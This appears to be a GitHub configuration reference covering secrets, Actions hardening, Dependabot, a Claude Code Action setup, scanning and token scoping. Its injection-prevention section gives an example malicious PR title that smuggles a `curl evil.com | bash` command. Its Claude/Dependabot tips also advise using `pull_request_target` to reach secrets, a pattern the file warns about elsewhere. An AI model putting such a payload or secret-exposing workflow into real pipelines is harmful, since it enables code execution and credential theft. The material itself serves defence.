---
name: GitHub Config Reference
description: Detailed configuration reference for GitHub setup — secrets, Actions, Dependabot, Claude, scanning, auth, and free-tier boundaries. XML-tagged for quick lookup.
---

<secrets>
<repo-secrets>
- `gh secret set NAME --body "value"` — set from literal
- `gh secret set NAME < file.txt` — set from file
- `gh secret set NAME --env production` — environment-scoped
- `gh secret list` — list names + timestamps (never reveals values)
- `gh secret delete NAME` — remove a secret
- Encrypted with libsodium sealed boxes client-side, decrypted only at runtime
- Auto-masked in logs as `***` — masking is line-based, not retroactive
- `::add-mask::VALUE` — mask dynamically derived sensitive data
- Never store structured data (JSON/XML) as one secret — split into individual secrets
- Naming: `SCREAMING_SNAKE_CASE`, prefix by provider (`AWS_`, `GCP_`, `DOCKER_`), suffix by type (`_TOKEN`, `_KEY`, `_PASSWORD`)
- Override order: org (lowest) < repo < environment (highest)
</repo-secrets>

<oidc>
- GitHub mints short-lived JWT per job — cloud providers exchange for temp credentials
- Eliminates static long-lived keys entirely
- Requires `permissions: id-token: write` on the job
- Claims: `sub`, `repository`, `ref`, `environment`, `actor`, `sha`, `run_id`
- Trust policy: validate `sub` claim in cloud IAM — e.g. `repo:org/repo:ref:refs/heads/main`
- AWS: `aws-actions/configure-aws-credentials` with OIDC mode
- GCP: `google-github-actions/auth` with workload identity
- Azure: `azure/login` with federated credentials
- Free on all plans
</oidc>

<github-token>
- Auto-generated per workflow run, scoped to triggering repo, expires when job ends
- Default read-only since 2023: `contents: read`, `metadata: read`
- Elevate per-job with `permissions:` key — never beyond repo maximum
- Cannot trigger other workflows (prevents recursion)
- Cannot access other repos
- Fork PRs get read-only token, no secrets access
- Granular scopes: `contents`, `pull-requests`, `issues`, `packages`, `id-token`, `actions`, `checks`, `deployments`, `pages`, `security-events`, `statuses`
</github-token>
</secrets>

<actions-security>
<pinning>
- Pin to full 40-char SHA: `uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29`
- Tags are mutable — compromised maintainer can repoint without version change
- Use Dependabot with `github-actions` ecosystem to auto-propose SHA bumps
- Verify SHA originates from official repo, not a fork
</pinning>

<permissions>
- Set `permissions: {}` (empty) at workflow level — grant only per-job
- Minimum for common jobs:
  - Build/test: `contents: read`
  - Create PR: `contents: write` + `pull-requests: write`
  - Deploy with OIDC: `id-token: write`
  - Comment on issues: `issues: write`
  - Publish packages: `packages: write`
</permissions>

<injection-prevention>
- NEVER interpolate `${{ github.event.*.title }}` or `${{ github.event.*.body }}` in `run:` blocks
- Pass as env var: `env: TITLE: ${{ github.event.pull_request.title }}` then use `"$TITLE"` in shell
- A malicious title like `"; curl evil.com | bash; #` achieves arbitrary code execution via interpolation
- For `actions/github-script`: use `context.payload` properties, not template expansion
</injection-prevention>

<pull-request-target>
- `pull_request` — runs in fork context, read-only token, no secrets. Safe for untrusted PRs
- `pull_request_target` — runs in base branch context, WRITE permissions, FULL secret access
- NEVER checkout + execute PR head code in `pull_request_target`
- Two-workflow pattern if secrets needed: `pull_request` produces artifacts then privileged workflow consumes verified artifacts only
</pull-request-target>

<runners>
- GitHub-hosted: ephemeral, isolated, safe by default
- Self-hosted: NEVER on public repos — untrusted code compromises the runner
- On private repos: users with read access can fork and compromise self-hosted runners
</runners>

<hardened-ci-template>
```yaml
name: CI
on:
  pull_request:
    branches: [main]

permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4
      - name: Build
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Building PR: $PR_TITLE"
          # Add actual build/test commands
```
</hardened-ci-template>
</actions-security>

<dependabot>
<config-keys>
- `version: 2` — required at top level
- `package-ecosystem` — npm, pip, cargo, gomod, maven, gradle, nuget, composer, docker, github-actions, terraform, pub, hex, bundler
- `directory` / `directories` — manifest location(s) relative to repo root
- `schedule.interval` — daily, weekly, monthly, quarterly, semiannually, yearly, cron
- `schedule.day` — specific day for weekly (e.g. "monday")
- `schedule.time` — HH:MM format (UTC default)
- `schedule.timezone` — IANA timezone
- `groups` — batch updates: `patterns` (glob), `dependency-type` (production/development), `update-types` (major/minor/patch), `exclude-patterns`
- `allow` — whitelist deps by name (glob) or type
- `ignore` — skip by `dependency-name` (glob), `versions` (constraint), `update-types`
- `labels` — auto-label PRs (labels must exist)
- `assignees` — auto-assign users
- `reviewers` — auto-request reviews (supports `org/team` slugs)
- `milestone` — milestone number (integer)
- `commit-message` — `prefix`, `prefix-development`, `include: "scope"`
- `open-pull-requests-limit` — default 5, set 0 to pause
- `target-branch` — PR base branch (default: repo default)
- `versioning-strategy` — auto, increase, widen, lockfile-only
- `rebase-strategy` — auto (default) or disabled
- `registries` — private registry auth
- `cooldown` — delay updates by days per semver level
- `vendor` — maintain vendored deps (bundler, gomod)
- `insecure-external-code-execution` — allow for bundler/mix/pip
</config-keys>

<dependabot-template>
```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    open-pull-requests-limit: 10
    groups:
      minor-and-patch:
        patterns: ["*"]
        update-types: ["minor", "patch"]
    ignore:
      - dependency-name: "*"
        update-types: ["version-update:semver-major"]

  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns: ["*"]
```
</dependabot-template>

<dependabot-commands>
- `@dependabot merge` — merge after CI passes
- `@dependabot squash and merge` — squash-merge after CI
- `@dependabot rebase` — rebase branch onto base
- `@dependabot recreate` — close and recreate from scratch
- `@dependabot close` — close, won't reopen
- `@dependabot ignore this major version` — persistent ignore rule
- `@dependabot ignore this minor version` — persistent ignore rule
- `@dependabot ignore this dependency` — stop all updates
- `@dependabot cancel merge` — cancel queued merge
- Only users with write access can issue commands
</dependabot-commands>

<security-vs-version-updates>
- **Security updates**: auto-enabled, no YAML needed, fire immediately on advisory, bypass schedule + PR limit, bump to minimum non-vulnerable version
- **Version updates**: opt-in via YAML, follow schedule, proactive bumps to latest
- Security updates override ignore rules and PR limits
</security-vs-version-updates>
</dependabot>

<auto-merge>
<workflow-template>
```yaml
name: Auto-merge Dependabot PRs
on: pull_request

permissions:
  contents: write
  pull-requests: write

jobs:
  auto-merge:
    runs-on: ubuntu-latest
    if: github.actor == 'dependabot[bot]'
    steps:
      - name: Fetch Dependabot metadata
        id: metadata
        uses: dependabot/fetch-metadata@d7267f607e9d3fb96fc2fbe83e0af444713e90b7 # v2
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}

      - name: Approve PR (patch + minor only)
        if: steps.metadata.outputs.update-type != 'version-update:semver-major'
        run: gh pr review --approve "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Enable auto-merge
        if: steps.metadata.outputs.update-type != 'version-update:semver-major'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```
</workflow-template>

<filtering>
- `steps.metadata.outputs.update-type` — `version-update:semver-patch`, `version-update:semver-minor`, `version-update:semver-major`
- `steps.metadata.outputs.dependency-names` — the package name
- `steps.metadata.outputs.package-ecosystem` — npm_and_yarn, pip, github_actions, docker
- `steps.metadata.outputs.dependency-type` — direct:production, direct:development
- Dependabot can't approve its own PRs — workflow runs as `github-actions[bot]` (different actor)
- `--auto` flag waits for all branch protection checks before merging
</filtering>
</auto-merge>

<claude-integration>
<github-action>
- `uses: anthropics/claude-code-action@v1`
- Requires `ANTHROPIC_API_KEY` as repo secret
- Triggers: `issue_comment`, `pull_request_review_comment`, `issues`, `pull_request`
- Auto-detects: interactive (`@claude` mention) vs automation (direct `prompt` param)
- Optional: `trigger_phrase` for custom trigger, `claude_args` for CLI flags
</github-action>

<action-template>
```yaml
name: Claude Code
on:
  issue_comment:
    types: [created]
  pull_request_review_comment:
    types: [created]

permissions:
  contents: write
  pull-requests: write
  issues: write

jobs:
  claude:
    if: contains(github.event.comment.body, '@claude')
    runs-on: ubuntu-latest
    steps:
      - uses: anthropics/claude-code-action@v1
        with:
          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
```
</action-template>

<headless>
- `claude -p "prompt"` — non-interactive, one-shot
- `--output-format json` — structured output with session_id
- `--output-format stream-json` — real-time token streaming
- `--allowedTools "Read,Edit,Bash"` — pre-approve tools without prompts
- `--resume "$session_id"` — continue previous session
- `claude --from-pr <number>` — resume from a PR context
</headless>

<claude-dependabot-combo>
- Trigger: `if: github.actor == 'dependabot[bot]'` or branch filter `dependabot/**`
- Must use `pull_request_target` to access `ANTHROPIC_API_KEY` from secrets
- Prompt Claude to classify risk: LOW (auto-merge), MEDIUM (notify), HIGH (block + tag human)
- Use `continue-on-error: true` on Claude step so API outages don't block PRs
</claude-dependabot-combo>
</claude-integration>

<scanning>
<free-features>
- Dependency graph + SBOM export — free on all repos
- Push protection (user-level) — blocks pushes with known secret patterns, on by default
- GitHub Advisory Database — full access, free
- Dependabot alerts — free on all repos
- Secret scanning (partner alerts) — free on public repos only
- Code scanning / CodeQL — free on public repos only
</free-features>

<paid-only>
- Secret scanning on private repos — Secret Protection add-on
- Code scanning on private repos — Code Security add-on
- Custom secret scanning patterns — Secret Protection add-on
- Validity checks — Secret Protection add-on
</paid-only>

<enable-alerts>
```bash
# Enable vulnerability alerts
gh api repos/{owner}/{repo}/vulnerability-alerts --method PUT

# Check security settings
gh api /repos/{owner}/{repo} --jq '.security_and_analysis'
```
</enable-alerts>

<leaked-secret-playbook>
1. Revoke immediately at the issuing provider
2. Assess blast radius via provider audit logs
3. Remove from git history: `git filter-repo` (not just a new commit)
4. Rotate all downstream credentials the leaked secret could access
5. Resolve the alert in GitHub Security tab
6. Enable push protection to prevent recurrence
</leaked-secret-playbook>
</scanning>

<auth>
<token-types>
- **GITHUB_TOKEN**: auto per job, repo-scoped, read-only default, expires on job end. Free
- **Fine-grained PAT**: per-repo scoping, 50+ permissions, mandatory expiry (max 1yr). Free. Use for all new automation
- **Classic PAT**: coarse scopes (`repo` = ALL repos). Legacy, avoid for new work. Free
- **GitHub App**: installation tokens (1hr, auto-rotating), bot identity, not tied to user. 5k req/hr. Free
- **Deploy key**: per-repo SSH, read-only default, no API access beyond git. Free
</token-types>

<minimum-permissions>
- Clone private: `contents: read`
- Push commits: `contents: write`
- Create/merge PR: `contents: write` + `pull-requests: write`
- Manage issues: `issues: write`
- Create release: `contents: write`
- Publish packages: `packages: write`
</minimum-permissions>

<rotation>
- Fine-grained PATs: 30-90 day expiry
- GitHub App tokens: auto-rotate (1hr)
- Revoke all tokens on personnel departure
- Never embed tokens in code
- Prefer OIDC over any static token
</rotation>
</auth>

<branch-protection>
<free-tier>
- Available on public repos (Free) and private repos (Pro $4/mo+)
- On free private repos: NO branch protection — rely on team discipline
</free-tier>

<recommended-settings>
```json
{
  "required_status_checks": {
    "strict": true,
    "contexts": ["CI"]
  },
  "enforce_admins": true,
  "required_pull_request_reviews": {
    "required_approving_review_count": 1,
    "dismiss_stale_reviews": true
  },
  "restrictions": null,
  "allow_force_pushes": false,
  "allow_deletions": false
}
```
</recommended-settings>

<apply>
```bash
gh api repos/{owner}/{repo}/branches/{branch}/protection \
  --method PUT --input protection.json
```
</apply>

<rulesets>
- Newer system, supports multiple layered rules on same branch
- Target branches AND tags with fnmatch patterns
- Explicit bypass lists, evaluate mode (audit-only)
- Requires Team plan for private repos
</rulesets>
</branch-protection>

<free-tier-boundaries>
<free-everywhere>
- Repository secrets, OIDC, fine-grained PATs, GitHub Apps, deploy keys
- GitHub Actions (2,000 min/mo private, unlimited public)
- Dependabot (alerts, security updates, version updates, grouping)
- Push protection (user-level), dependency graph, advisory database
- CODEOWNERS file (advisory only — enforcement needs Pro)
</free-everywhere>

<free-public-only>
- Secret scanning (partner alerts)
- Code scanning / CodeQL
- Branch protection (reviews, status checks, signed commits)
- CODEOWNERS enforcement
- Artifact attestations
- GitHub Pages
</free-public-only>

<paid-required>
- Branch protection on private repos — Pro $4/mo
- Environment secrets + protection rules — Pro $4/mo
- Org secrets for private repos — Team $4/user/mo
- Repository rulesets — Team
- Merge queue — Enterprise $21/user/mo
- Secret scanning on private repos — Secret Protection add-on
- Code scanning on private repos — Code Security add-on
</paid-required>
</free-tier-boundaries>
